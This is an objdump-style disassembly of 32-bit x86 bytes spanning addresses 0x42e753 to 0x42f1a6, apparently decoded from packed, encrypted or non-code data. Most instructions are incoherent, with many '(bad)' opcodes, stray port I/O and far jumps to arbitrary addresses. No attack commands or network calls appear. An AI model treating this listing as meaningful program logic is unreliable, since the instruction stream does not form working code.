  42e753:	mov    dl,0xa
  42e755:	push   ecx
  42e756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e757:	ins    BYTE PTR es:[edi],dx
  42e758:	test   DWORD PTR [ebx+ecx*1-0x69],0x80646810
  42e760:	(bad)  
  42e761:	shl    DWORD PTR [ebx-0x45454bf9],1
  42e767:	call   0x26789c97
  42e76c:	cmp    al,BYTE PTR [eax]
	...
  42e7d6:	pop    edx
  42e7d7:	cmp    DWORD PTR [esi+0x2d],ecx
  42e7da:	outs   dx,DWORD PTR ds:[esi]
  42e7db:	jg     0x42e858
  42e7dd:	jg     0x42e843
  42e7df:	sub    BYTE PTR [esi],cl
  42e7e1:	ficomp DWORD PTR [edi+0x4c989262]
  42e7e7:	icebp  
  42e7e8:	add    DWORD PTR [eax],eax
  42e7ea:	inc    DWORD PTR [eax]
  42e7ec:	add    BYTE PTR [eax],al
  42e7ee:	stos   BYTE PTR es:[edi],al
  42e7ef:	adc    ch,BYTE PTR [ecx+0x4b60fe73]
  42e7f5:	cdq    
  42e7f6:	sbb    eax,0x71348717
  42e7fb:	imul   ebp,DWORD PTR [edi],0x7c
  42e7fe:	adc    al,0xbe
  42e800:	xor    al,0x68
  42e802:	jb     0x42e7a0
  42e804:	sub    eax,0x5649c05e
  42e809:	xor    ebx,0xffffffb5
  42e80c:	mov    DWORD PTR [esp+ebx*8-0xc],ebx
  42e810:	xchg   esp,eax
  42e811:	fcmovu st,st(3)
  42e813:	loop   0x42e859
  42e815:	and    ax,0xfece
  42e819:	dec    edx
  42e81a:	sbb    esi,DWORD PTR [edx-0xf666639]
  42e820:	push   esi
  42e821:	xor    eax,0x51947ea9
  42e826:	cmovle esp,DWORD PTR [esi]
  42e829:	push   ss
  42e82a:	dec    edi
  42e82b:	hlt    
  42e82c:	inc    edi
  42e82d:	jmp    0x353a:0xe334ee7d
  42e834:	mov    cl,0x11
  42e836:	lock ficom WORD PTR [ebp-0x5b]
  42e83a:	aad    0xbd
  42e83c:	icebp  
  42e83d:	jl     0x42e84a
  42e83f:	inc    eax
  42e840:	xchg   edi,eax
  42e841:	pusha  
  42e842:	jl     0x42e855
  42e844:	scas   eax,DWORD PTR es:[edi]
  42e845:	add    al,0x80
  42e847:	sub    cl,BYTE PTR [eax+0x1002c5b5]
  42e84d:	cwde   
  42e84e:	add    BYTE PTR [ebx-0x55],ch
  42e851:	pop    eax
  42e852:	es and cl,ah
  42e855:	ss jle 0x42e844
  42e858:	sar    DWORD PTR [edi+0x6dc79949],1
  42e85e:	pop    ss
  42e85f:	int    0x41
  42e861:	and    BYTE PTR ds:0xa9d775bc,bh
  42e867:	push   ebx
  42e868:	ds data16 loopne 0x42e894
  42e86c:	pop    ebp
  42e86d:	(bad)  
  42e86e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e86f:	or     al,0xc5
  42e871:	add    bl,BYTE PTR [esi+ebp*8-0x20]
  42e875:	and    al,0x34
  42e877:	ins    DWORD PTR es:[edi],dx
  42e878:	inc    esp
  42e879:	dec    ebp
  42e87a:	xchg   esi,eax
  42e87b:	mov    DWORD PTR [eax+0x6749c958],ebp
  42e881:	mov    ds:0x9a2c2ded,eax
  42e886:	into   
  42e887:	sbb    cl,bh
  42e889:	scas   eax,DWORD PTR es:[edi]
  42e88a:	dec    esi
  42e88b:	in     eax,dx
  42e88c:	mov    esp,cs
  42e88e:	lock pop edx
  42e890:	mov    al,ds:0xb86af513
  42e895:	dec    eax
  42e896:	mov    esi,0x2e687a68
  42e89b:	sbb    eax,0x5cc3e1a4
  42e8a0:	dec    ecx
  42e8a1:	dec    edi
  42e8a2:	leave  
  42e8a3:	ins    DWORD PTR es:[edi],dx
  42e8a4:	jmp    0xbe60fad3
  42e8a9:	adc    BYTE PTR [edx+0x55],0xcf
  42e8ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e8ae:	addr16 mov ebp,0xa140ebf2
  42e8b4:	add    eax,0xdb377386
  42e8b9:	inc    ebx
  42e8ba:	imul   ebp,DWORD PTR [edi+ebp*8+0x14],0xffffffef
  42e8bf:	push   0x3c9524c6
  42e8c4:	or     bh,al
  42e8c6:	xchg   bl,dh
  42e8c8:	iret   
  42e8c9:	lahf   
  42e8ca:	shr    BYTE PTR [esp+edx*1-0x1db392f9],cl
  42e8d1:	shr    DWORD PTR [ecx],cl
  42e8d3:	cmp    DWORD PTR [esi],esp
  42e8d5:	xor    BYTE PTR [ebx],cl
  42e8d7:	jno    0x42e935
  42e8d9:	or     DWORD PTR [edx-0x7c8bb5d4],edi
  42e8df:	xchg   esp,eax
  42e8e0:	mov    bl,0xbe
  42e8e2:	je     0x42e8b3
  42e8e4:	in     eax,dx
  42e8e5:	in     al,0xb
  42e8e7:	(bad)  
  42e8e8:	pop    es
  42e8e9:	pop    edi
  42e8ea:	dec    edi
  42e8eb:	jno    0x42e8da
	...
  42e955:	add    bl,al
  42e957:	ja     0x42e9b9
  42e959:	and    al,0xf4
  42e95b:	aaa    
  42e95c:	(bad)  
  42e95d:	div    DWORD PTR [ecx-0x6ddc07d5]
  42e963:	out    dx,al
  42e964:	jo     0x42e933
  42e966:	dec    ebx
  42e967:	repnz add DWORD PTR [eax],eax
  42e96a:	inc    DWORD PTR [eax]
  42e96c:	add    BYTE PTR [eax],al
  42e96e:	or     DWORD PTR [edi-0x7e],edi
  42e971:	cdq    
  42e972:	jb     0x42e90a
  42e974:	inc    edx
  42e975:	mov    dh,0x9e
  42e977:	fwait
  42e978:	sbb    eax,0xeced43f3
  42e97d:	mov    DWORD PTR [ebx+0x1c51c2ce],0x9dec00f0
  42e987:	add    dh,BYTE PTR [edx-0x7680410]
  42e98d:	jmp    0x42e9aa
  42e98f:	int    0x1d
  42e991:	dec    esi
  42e992:	pop    ds
  42e993:	sbb    eax,0x56e23fac
  42e998:	jmp    0x13e9:0x2d87ba38
  42e99f:	(bad)  
  42e9a1:	sbb    eax,0xd2474a70
  42e9a6:	mov    ch,0x86
  42e9a8:	mov    esi,0xe82f64d
  42e9ad:	mov    ebp,0x806e0e6a
  42e9b2:	sub    BYTE PTR [ebp-0x31],0x1f
  42e9b6:	fisub  DWORD PTR [edi+0x59c75799]
  42e9bc:	mov    BYTE PTR [edi+0x597223d1],bh
  42e9c2:	fsub   DWORD PTR ds:0xa1ebd092
  42e9c8:	jmp    0x76c62e9e
  42e9cd:	adc    al,0x5
  42e9cf:	out    0x25,al
  42e9d1:	lock gs repnz mov edx,0x965041b3
  42e9d9:	out    dx,al
  42e9da:	retf   
  42e9db:	jmp    0x42e971
  42e9dd:	test   BYTE PTR [ebp+0x22dba44],0x5c
  42e9e4:	xor    ecx,ecx
  42e9e6:	cmc    
  42e9e7:	mov    eax,0x8e245c48
  42e9ec:	enter  0xea0b,0x1c
  42e9f0:	push   ss
  42e9f1:	inc    edi
  42e9f2:	inc    eax
  42e9f3:	gs pop eax
  42e9f5:	pop    ds
  42e9f6:	sub    edi,esp
  42e9f8:	lahf   
  42e9f9:	jmp    DWORD PTR fs:[ebx]
  42e9fc:	adc    eax,0xbf7168b0
  42ea01:	aam    0x2e
  42ea03:	push   esi
  42ea04:	dec    eax
  42ea05:	adc    esi,DWORD PTR [ebx-0x6e43272]
  42ea0b:	add    eax,0x94914c39
  42ea10:	cmp    edi,ebp
  42ea12:	xchg   BYTE PTR ds:0xff70b699,ah
  42ea18:	adc    ebp,DWORD PTR [esi]
  42ea1a:	repz cmp BYTE PTR [esi],ch
  42ea1d:	push   DWORD PTR [esi]
  42ea1f:	add    DWORD PTR es:[edi-0xe],0x88178b71
  42ea27:	test   BYTE PTR [ecx],bl
  42ea29:	jb     0x42e9b5
  42ea2b:	stos   DWORD PTR es:[edi],eax
  42ea2c:	xor    bh,BYTE PTR [edi]
  42ea2e:	mov    eax,0x9ecf1a5
  42ea33:	inc    edi
  42ea34:	inc    esp
  42ea35:	push   edx
  42ea36:	fdiv   QWORD PTR [eax]
  42ea38:	int3   
  42ea39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ea3a:	outs   dx,BYTE PTR ds:[esi]
  42ea3b:	inc    ebx
  42ea3c:	rcr    DWORD PTR [ecx+0x301a52d9],1
  42ea42:	test   eax,0x10a3c613
  42ea47:	dec    ebp
  42ea48:	mov    al,0xf1
  42ea4a:	jae    0x42ea13
  42ea4c:	and    DWORD PTR [edi+0x9],esi
  42ea4f:	xor    al,0x73
  42ea51:	aas    
  42ea52:	mov    cl,dl
  42ea54:	stc    
  42ea55:	arpl   WORD PTR [ecx+eax*1-0x1c],bx
  42ea59:	pop    ecx
  42ea5a:	push   ebx
  42ea5b:	jmp    0x42eaa1
  42ea5d:	sbb    eax,0xc36f3320
  42ea62:	out    dx,al
  42ea63:	dec    esi
  42ea64:	lds    ebx,FWORD PTR [ebx-0x12]
  42ea67:	sahf   
  42ea68:	in     eax,0x5b
  42ea6a:	fild   WORD PTR [edi]
  42ea6c:	mov    esi,0x0
	...
  42ead5:	add    ch,ah
  42ead7:	mov    edx,0xebdfe392
  42eadc:	cmc    
  42eadd:	mov    esi,0x66dc160c
  42eae2:	push   0x4a2bbc7c
  42eae7:	repz add DWORD PTR [eax],eax
  42eaea:	inc    DWORD PTR [eax]
  42eaec:	add    BYTE PTR [eax],al
  42eaee:	cld    
  42eaef:	std    
  42eaf0:	hlt    
  42eaf1:	mov    edi,0xc9a8f2d6
  42eaf6:	jl     0x42eb57
  42eaf8:	scas   eax,DWORD PTR es:[edi]
  42eaf9:	add    eax,0xe6b4648e
  42eafe:	stc    
  42eaff:	or     al,0x6
  42eb01:	adc    bl,ah
  42eb03:	cmp    al,0xc7
  42eb05:	loop   0x42eb50
  42eb07:	push   ebp
  42eb08:	sahf   
  42eb09:	mov    al,0xfd
  42eb0b:	fcom   QWORD PTR [edi+0x78c039e9]
  42eb11:	imul   edi,DWORD PTR [ebx+eiz*1+0x1944fa55],0xf8123884
  42eb1c:	fisttp QWORD PTR [edi]
  42eb1e:	test   BYTE PTR [ebx-0x2800906],ah
  42eb24:	and    eax,DWORD PTR [ebx]
  42eb26:	shr    cl,cl
  42eb28:	dec    eax
  42eb29:	inc    edx
  42eb2a:	mov    ds:0x49a95536,al
  42eb2f:	push   edi
  42eb30:	out    dx,al
  42eb31:	mov    al,0x8f
  42eb33:	pop    ds
  42eb34:	mov    ebx,0xca85de0b
  42eb39:	mov    sp,0x55ef
  42eb3d:	bound  esp,QWORD PTR [eax+0x6807519b]
  42eb43:	arpl   WORD PTR [esi-0xe],sp
  42eb46:	or     DWORD PTR [edx-0x48c7903e],edx
  42eb4c:	shr    BYTE PTR [bx-0x55],cl
  42eb50:	inc    esi
  42eb51:	(bad)  
  42eb52:	icebp  
  42eb53:	in     al,dx
  42eb54:	pushf  
  42eb55:	sbb    ebp,DWORD PTR [esi+eiz*2+0x4ec4a6d5]
  42eb5c:	xor    edi,ebx
  42eb5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eb5f:	retf   
  42eb60:	repz dec BYTE PTR [ebx]
  42eb63:	push   edi
  42eb64:	pop    edi
  42eb65:	hlt    
  42eb66:	and    bh,BYTE PTR [esi-0x49e2b11a]
  42eb6c:	inc    ecx
  42eb6d:	repz jmp 0x20ddfa5e
  42eb73:	pusha  
  42eb74:	add    ecx,DWORD PTR [ebx-0x65]
  42eb77:	add    DWORD PTR [ecx+0x66e43435],edx
  42eb7d:	nop
  42eb7e:	inc    esp
  42eb7f:	pop    edi
  42eb80:	dec    esi
  42eb81:	(bad)  
  42eb82:	cmp    al,0x5f
  42eb84:	or     al,BYTE PTR [ecx+0x26e20494]
  42eb8a:	cs repnz loop 0x42eb79
  42eb8e:	fs jbe 0x42ebf2
  42eb91:	repz inc esp
  42eb93:	and    dh,ah
  42eb95:	or     BYTE PTR [eax-0x7a],ch
  42eb98:	xor    ecx,eax
  42eb9a:	stos   BYTE PTR es:[edi],al
  42eb9b:	xor    al,0x7
  42eb9d:	push   ebx
  42eb9e:	cmc    
  42eb9f:	mov    ch,0x3f
  42eba1:	sbb    ah,ch
  42eba3:	inc    ecx
  42eba4:	jge    0x42ebaf
  42eba6:	test   DWORD PTR [edi+0xd],edx
  42eba9:	mov    ebp,ecx
  42ebab:	mov    ah,0xf6
  42ebad:	iret   
  42ebae:	add    eax,0x8ed3b024
  42ebb3:	ds inc ecx
  42ebb5:	int3   
  42ebb6:	imul   BYTE PTR [edi+eax*1-0x2d]
  42ebba:	dec    eax
  42ebbb:	push   0x24
  42ebbd:	addr16 sub eax,0xf0eec8c4
  42ebc3:	add    BYTE PTR [edi-0x1a2e588e],cl
  42ebc9:	out    0xf3,al
  42ebcb:	cld    
  42ebcc:	dec    esi
  42ebcd:	lods   al,BYTE PTR ds:[esi]
  42ebce:	lods   eax,DWORD PTR ds:[esi]
  42ebcf:	mov    ah,0xce
  42ebd1:	daa    
  42ebd2:	cmc    
  42ebd3:	adc    eax,0x7797c41b
  42ebd8:	pop    ebp
  42ebd9:	js     0x42ec16
  42ebdb:	shr    bh,0xab
  42ebde:	ret    0xc09d
  42ebe1:	addr16 xchg edx,eax
  42ebe3:	and    bl,BYTE PTR [ebx+0x4c]
  42ebe6:	rcl    cl,1
  42ebe8:	sbb    edx,ecx
  42ebea:	sbb    al,0x40
  42ebec:	sub    al,0x0
	...
  42ec56:	jle    0x42ec99
  42ec58:	jne    0xfc41bb9d
  42ec5e:	pusha  
  42ec5f:	popf   
  42ec60:	pop    ecx
  42ec61:	sbb    edx,0x49bb7755
  42ec67:	hlt    
  42ec68:	add    DWORD PTR [eax],eax
  42ec6a:	inc    DWORD PTR [eax]
  42ec6c:	add    BYTE PTR [eax],al
  42ec6e:	dec    edi
  42ec6f:	jge    0x42ec7b
  42ec71:	out    dx,eax
  42ec72:	cmp    edi,DWORD PTR [ebp+0x7d]
  42ec75:	pop    eax
  42ec76:	out    dx,al
  42ec77:	(bad)  
  42ec78:	mov    cl,BYTE PTR [edi+esi*1]
  42ec7b:	call   0xc43e:0xdef88043
  42ec82:	sub    BYTE PTR [ebx+eiz*1+0x25827405],bl
  42ec89:	sub    DWORD PTR [ecx-0x59],0xbe58e2d8
  42ec90:	jg     0x42ec36
  42ec92:	(bad)  
  42ec93:	or     ah,BYTE PTR [edi]
  42ec95:	pop    esi
  42ec96:	mov    edi,0xbbe9fff4
  42ec9b:	xchg   ebp,eax
  42ec9c:	adc    DWORD PTR [esi+edx*2],0x1f
  42eca0:	test   BYTE PTR [eax+0x60],ah
  42eca3:	mov    dh,0xec
  42eca5:	and    esp,DWORD PTR [ecx-0x59e0fc7f]
  42ecab:	inc    ebx
  42ecac:	fstp   DWORD PTR [edi]
  42ecae:	cs xchg ebx,eax
  42ecb0:	shl    DWORD PTR [ebx+0x463c9473],0x71
  42ecb7:	xchg   ecx,eax
  42ecb8:	popa   
  42ecb9:	jecxz  0x42ed03
  42ecbb:	aas    
  42ecbc:	out    0x8d,eax
  42ecbe:	or     dh,dh
  42ecc0:	sar    esi,1
  42ecc2:	fmul   DWORD PTR [edi+edx*4-0x29317f7f]
  42ecc9:	mov    bl,0xd1
  42eccb:	lock inc eax
  42eccd:	and    eax,0x822d2adc
  42ecd2:	jae    0x42ecef
  42ecd4:	stos   BYTE PTR es:[edi],al
  42ecd5:	push   ecx
  42ecd6:	xchg   edx,eax
  42ecd7:	xchg   esp,eax
  42ecd8:	jbe    0x42ecb8
  42ecda:	daa    
  42ecdb:	push   edi
  42ecdc:	(bad)
  42ecdf:	fwait
  42ece0:	pop    eax
  42ece1:	shl    dh,cl
  42ece3:	add    cl,BYTE PTR [edi+0x13]
  42ece6:	mov    cl,0x72
  42ece8:	add    eax,0xa2ce0c9e
  42eced:	cmp    BYTE PTR [ecx+0x7d5c712b],0xd3
  42ecf4:	out    0xd8,al
  42ecf6:	ins    BYTE PTR es:[edi],dx
  42ecf7:	and    cl,BYTE PTR [ecx+0x3b]
  42ecfa:	mov    ebp,eax
  42ecfc:	mov    DWORD PTR [edi-0x50ec1d5c],edx
  42ed02:	(bad)  
  42ed03:	or     DWORD PTR [esi+0x69],ecx
  42ed06:	sbb    al,0x59
  42ed08:	aaa    
  42ed09:	push   0x8deaaf7a
  42ed0e:	jo     0x42ecfb
  42ed10:	lock mov edi,0x55ff6652
  42ed16:	xchg   edi,eax
  42ed17:	aas    
  42ed18:	out    dx,eax
  42ed19:	xlat   BYTE PTR ds:[ebx]
  42ed1a:	mov    ah,0xcf
  42ed1c:	psubb  mm5,QWORD PTR [edx]
  42ed1f:	je     0x42ecad
  42ed21:	lds    ebx,FWORD PTR [edx]
  42ed23:	adc    BYTE PTR [ebp+0x2485aecd],ch
  42ed29:	xor    edi,0xffffffb8
  42ed2c:	in     eax,0x46
  42ed2e:	aaa    
  42ed2f:	cli    
  42ed30:	vaesenclast ymm0,ymm0,YMMWORD PTR [ecx-0x59]
  42ed36:	(bad)  
  42ed37:	retf   
  42ed38:	push   eax
  42ed39:	push   esi
  42ed3a:	jecxz  0x42ed35
  42ed3c:	int    0xe5
  42ed3e:	push   es
  42ed3f:	(bad)  
  42ed40:	and    ch,BYTE PTR [esi]
  42ed42:	mov    dl,0x5f
  42ed44:	adc    BYTE PTR [edx],0xdd
  42ed47:	pop    ds
  42ed48:	in     eax,dx
  42ed49:	xchg   ebp,eax
  42ed4a:	test   BYTE PTR [esi+eax*2-0x14eba0bd],al
  42ed51:	dec    ebp
  42ed52:	mov    eax,0xceed49af
  42ed57:	inc    ecx
  42ed58:	pop    ebx
  42ed59:	retf   
  42ed5a:	cmp    ebx,ecx
  42ed5c:	pusha  
  42ed5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ed5e:	jne    0x42edaa
  42ed60:	shl    DWORD PTR [edi+0x73],cl
  42ed63:	test   al,0xf9
  42ed65:	popf   
  42ed66:	pop    esi
  42ed67:	and    al,0xba
  42ed69:	fnsave [ecx-0x51]
  42ed6c:	push   ds
	...
  42edd5:	add    BYTE PTR [edx],ch
  42edd7:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42eddd:	mul    bl
  42eddf:	xor    al,BYTE PTR [ebp+0x7f69b4a2]
  42ede5:	int3   
  42ede6:	dec    eax
  42ede7:	cmc    
  42ede8:	add    DWORD PTR [eax],eax
  42edea:	inc    DWORD PTR [eax]
  42edec:	add    BYTE PTR [eax],al
  42edee:	shl    DWORD PTR [edx],0x69
  42edf1:	and    DWORD PTR [ebx+0x4c],ebx
  42edf4:	(bad)  
  42edf5:	repnz xor DWORD PTR [edi-0x6c954784],ebp
  42edfc:	cld    
  42edfd:	xchg   edx,eax
  42edfe:	cmp    eax,DWORD PTR [esi+0xb]
  42ee01:	add    eax,0xb08560b3
  42ee06:	ds out 0xba,al
  42ee09:	add    esp,esi
  42ee0b:	or     DWORD PTR [edx+eiz*8-0x674630b5],eax
  42ee12:	mov    esi,0xad3bf975
  42ee17:	daa    
  42ee18:	retf   
  42ee19:	mov    esi,0x331f68b3
  42ee1e:	out    0x8f,al
  42ee20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee21:	jne    0x42ee97
  42ee23:	push   0xcad0cc40
  42ee28:	push   ebp
  42ee29:	xor    ecx,ebx
  42ee2b:	repnz inc ebx
  42ee2d:	rcr    BYTE PTR [edi],cl
  42ee2f:	fisubr DWORD PTR [ecx+0x5027dcb3]
  42ee35:	and    dl,al
  42ee37:	ret    0xf34e
  42ee3a:	clc    
  42ee3b:	dec    edi
  42ee3c:	and    eax,0x649f6bec
  42ee41:	mov    cl,0xe1
  42ee43:	push   0xffffffb9
  42ee45:	pusha  
  42ee46:	mov    BYTE PTR [edx+ebp*2-0x43e8876b],dh
  42ee4d:	mov    dh,BYTE PTR [esi+0x11]
  42ee50:	or     al,0xca
  42ee52:	push   esp
  42ee53:	sub    BYTE PTR [esi-0x3e3c455d],0xd4
  42ee5a:	aam    0x13
  42ee5c:	add    eax,0xce6743fe
  42ee61:	pop    ss
  42ee62:	lahf   
  42ee63:	xchg   edi,eax
  42ee64:	jl     0x42eee1
  42ee66:	push   es
  42ee67:	lea    edi,[ebp-0x7bf6f2f6]
  42ee6d:	pop    edi
  42ee6e:	inc    ecx
  42ee6f:	call   0x439cb221
  42ee74:	into   
  42ee75:	push   ds
  42ee76:	nop
  42ee77:	lods   al,BYTE PTR ds:[esi]
  42ee78:	scas   eax,DWORD PTR es:[edi]
  42ee79:	xor    eax,0x55c60a98
  42ee7e:	xlat   BYTE PTR ds:[ebx]
  42ee7f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  42ee81:	fcmovnb st,st(1)
  42ee83:	data16 ja 0x42ee10
  42ee86:	arpl   bp,di
  42ee88:	mov    dl,0xca
  42ee8a:	loop   0x42ee72
  42ee8c:	push   eax
  42ee8d:	rcr    dh,1
  42ee8f:	push   0x68
  42ee91:	scas   eax,DWORD PTR es:[edi]
  42ee92:	leave  
  42ee93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee94:	push   edx
  42ee95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee96:	cmc    
  42ee97:	call   FWORD PTR [esi+edx*4-0x4]
  42ee9b:	fdiv   DWORD PTR [eax-0x49]
  42ee9e:	jo     0x42ee89
  42eea0:	mov    esp,0x68a7b70
  42eea5:	cmp    BYTE PTR [edx-0x2d],al
  42eea8:	outs   dx,BYTE PTR ds:[esi]
  42eea9:	sbb    bh,BYTE PTR [esp+eax*8+0x4c807574]
  42eeb0:	inc    ebp
  42eeb1:	mov    DWORD PTR [esi+eiz*2],esp
  42eeb4:	icebp  
  42eeb5:	adc    bl,0x5
  42eeb8:	test   DWORD PTR [ecx-0x5b],ebx
  42eebb:	sbb    ebx,esp
  42eebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eebe:	push   0x29
  42eec0:	popa   
  42eec1:	mov    ds:0x7c89ee61,al
  42eec6:	call   0x7b8eec0
  42eecb:	mov    cl,0xdc
  42eecd:	jle    0x42ee80
  42eecf:	sbb    al,0x1
  42eed1:	sub    eax,0xa735fa8d
  42eed6:	push   DWORD PTR [edx+0x51]
  42eed9:	ins    BYTE PTR es:[edi],dx
  42eeda:	ss jb  0x42ef1a
  42eedd:	push   ebx
  42eede:	scas   al,BYTE PTR es:[edi]
  42eedf:	mov    ds:0xef47232d,al
  42eee4:	add    al,0xe2
  42eee6:	shr    DWORD PTR [ebp-0x62b106dc],0x2b
	...
  42ef55:	add    bl,al
  42ef57:	add    cl,BYTE PTR [eax]
  42ef59:	xor    eax,0xf6ff3fc9
  42ef5e:	jb     0x42ef9c
  42ef60:	jae    0x42ef87
  42ef62:	out    0xf3,al
  42ef64:	int3   
  42ef65:	popa   
  42ef66:	inc    edi
  42ef67:	test   BYTE PTR [ecx],0x0
  42ef6a:	inc    DWORD PTR [eax]
  42ef6c:	add    BYTE PTR [eax],al
  42ef6e:	xchg   ebx,eax
  42ef6f:	cmp    eax,0x5413794
  42ef74:	ret    0xa390
  42ef77:	inc    edx
  42ef78:	inc    edi
  42ef79:	xchg   ebx,eax
  42ef7a:	cmp    BYTE PTR [edx-0x2a38db45],dh
  42ef80:	mov    ds:0xc81810c,al
  42ef85:	and    eax,0x8f6f4d1a
  42ef8a:	dec    ebp
  42ef8b:	mov    BYTE PTR [edx-0x1eac0d42],bl
  42ef91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ef92:	repz adc DWORD PTR [ebx],edi
  42ef95:	dec    DWORD PTR [edi-0x3b]
  42ef98:	popf   
  42ef99:	jl     0x42efab
  42ef9b:	mov    ecx,0xcae2dfad
  42efa0:	xchg   ebx,eax
  42efa1:	jl     0x42f00c
  42efa3:	js     0x42ef82
  42efa5:	fxch   st(3)
  42efa7:	in     eax,dx
  42efa8:	sbb    eax,0xe008868b
  42efad:	scas   eax,DWORD PTR es:[edi]
  42efae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42efaf:	mov    eax,0x9a7e9d81
  42efb4:	jbe    0x42ef74
  42efb6:	cs repz inc esp
  42efb9:	and    edi,edi
  42efbb:	nop
  42efbc:	lea    edi,[edx]
  42efbe:	mov    ds:0xf129da39,eax
  42efc3:	or     al,0x8e
  42efc5:	and    edi,0xdcddbc70
  42efcb:	out    0xb8,eax
  42efcd:	out    0x6a,al
  42efcf:	push   esp
  42efd0:	jle    0x42efc4
  42efd2:	sar    DWORD PTR [bp+si],1
  42efd5:	mov    ?,WORD PTR [edi]
  42efd7:	xchg   BYTE PTR [ecx+ebx*4+0x33ecd4ef],ch
  42efde:	cmp    al,0x34
  42efe0:	in     al,0x49
  42efe2:	mov    ?,WORD PTR [edi]
  42efe4:	iret   
  42efe5:	ror    DWORD PTR [ebp+0x8],1
  42efe8:	push   0x23
  42efea:	mul    BYTE PTR [edi]
  42efec:	inc    edx
  42efed:	push   DWORD PTR ds:0x761551b0
  42eff3:	div    DWORD PTR [ebx-0x29]
  42eff6:	and    DWORD PTR [esp+edx*2-0xf835547],0x55
  42effe:	out    0xa6,al
  42f000:	push   ss
  42f001:	out    0xd6,al
  42f003:	xor    ecx,DWORD PTR [ebx+0x44]
  42f006:	fwait
  42f007:	loop   0x42f081
  42f009:	out    dx,al
  42f00a:	retf   0xb037
  42f00d:	sub    eax,0x3b544e69
  42f012:	dec    ecx
  42f013:	mov    ah,0x85
  42f015:	sub    bh,cl
  42f017:	mov    edi,0xeede3121
  42f01c:	out    0x10,eax
  42f01e:	and    eax,0xc98f147
  42f023:	fcom   DWORD PTR [edi]
  42f025:	aaa    
  42f026:	mov    al,0x17
  42f028:	jne    0x42efba
  42f02a:	stc    
  42f02b:	adc    eax,0x3b5e5409
  42f030:	inc    ebp
  42f031:	dec    edx
  42f032:	aad    0x72
  42f034:	aaa    
  42f035:	mov    DWORD PTR [esp+ebp*8+0x38],0x9eb43b28
  42f03d:	sar    BYTE PTR [edi+0x6f2ea0ce],cl
  42f043:	pushf  
  42f044:	fsub   st(0),st
  42f046:	call   0x8505:0x57f4bac
  42f04d:	push   ebp
  42f04e:	(bad)  
  42f04f:	das    
  42f050:	inc    edi
  42f051:	sub    eax,0xd3d239db
  42f056:	sub    esi,esp
  42f058:	mov    eax,ds:0x7d1efbf3
  42f05d:	jge    0x42eff0
  42f05f:	xchg   esi,eax
  42f060:	and    eax,0xe58d99ef
  42f065:	xor    al,0xc6
  42f067:	lea    edx,[edi+0x229460ee]
	...
  42f0d5:	add    BYTE PTR [edx],dl
  42f0d7:	ds int 0xe5
  42f0da:	in     eax,dx
  42f0db:	idiv   DWORD PTR [edx]
  42f0dd:	(bad)  
  42f0de:	js     0x42f0e3
  42f0e0:	mov    DWORD PTR [ecx],ecx
  42f0e2:	adc    DWORD PTR [eax+0x23],edx
  42f0e5:	mov    al,0x46
  42f0e7:	test   DWORD PTR [ecx],0xff00
  42f0ed:	add    BYTE PTR [eax+0x1b5d422c],bl
  42f0f3:	inc    esi
  42f0f4:	and    eax,0x40fa4977
  42f0f9:	or     eax,0xd62cb9d1
  42f0fe:	add    ah,BYTE PTR [edi+edi*2]
  42f101:	dec    DWORD PTR [ecx]
  42f103:	inc    esi
  42f104:	(bad)  
  42f105:	cs push ecx
  42f107:	outs   dx,DWORD PTR ds:[esi]
  42f108:	jno    0x42f12d
  42f10a:	std    
  42f10b:	mov    esp,0x469abab7
  42f110:	mov    ah,0xe
  42f112:	mov    al,0x52
  42f114:	sbb    BYTE PTR [ebp+0x1c],0xaf
  42f118:	add    BYTE PTR gs:[edx+0x57],0xa7
  42f11d:	jmp    0x765cf1a8
  42f122:	jecxz  0x42f0d2
  42f124:	and    al,BYTE PTR [edx+0x17]
  42f127:	dec    ebp
  42f128:	add    BYTE PTR [edx-0x1e],bl
  42f12b:	pushf  
  42f12c:	sbb    al,0xa7
  42f12e:	lods   eax,DWORD PTR ds:[esi]
  42f12f:	call   0x22096d9
  42f134:	aaa    
  42f135:	jns    0x42f1a2
  42f137:	mov    eax,ds:0x6b73ca89
  42f13c:	out    0x1f,eax
  42f13e:	inc    eax
  42f13f:	push   esi
  42f140:	sbb    BYTE PTR [eax],ah
  42f142:	mov    ?,WORD PTR [ebp+0x5c]
  42f145:	sti    
  42f146:	pop    ecx
  42f147:	loopne 0x42f15f
  42f149:	das    
  42f14a:	mov    ecx,edx
  42f14c:	sub    eax,0x9a1c1156
  42f151:	xchg   edx,eax
  42f152:	rcl    esi,0xac
  42f155:	mov    ecx,0x891442e5
  42f15a:	shl    al,1
  42f15c:	pushf  
  42f15d:	jns    0x42f120
  42f15f:	push   eax
  42f160:	sub    BYTE PTR [edx],dh
  42f162:	or     BYTE PTR [eax],cl
  42f164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f165:	ds fwait
  42f167:	mov    edx,0xabc5902
  42f16c:	add    cl,BYTE PTR [ebp-0xb]
  42f16f:	push   ds
  42f170:	push   0xfffffffe
  42f172:	push   0xe95e12a
  42f177:	js     0x42f10a
  42f179:	jno    0x42f106
  42f17b:	cmovae ebx,DWORD PTR [ecx+0x15]
  42f17f:	sub    al,0x81
  42f181:	mov    ds:0xd3c8041b,eax
  42f186:	sbb    al,BYTE PTR [ebx+0x34ec9123]
  42f18c:	xlat   BYTE PTR ds:[ebx]
  42f18d:	mov    ds:0x10d87427,al
  42f192:	mov    DWORD PTR [edi],edi
  42f194:	push   ecx
  42f195:	jo     0x42f1a8
  42f197:	aas    
  42f198:	ret    
  42f199:	mov    bl,bh
  42f19b:	and    al,0x25
  42f19d:	jmp    FWORD PTR [esi-0x21db0015]
  42f1a3:	xchg   ecx,eax
  42f1a4:	adc    ebx,edi
  42f1a6:	cld    
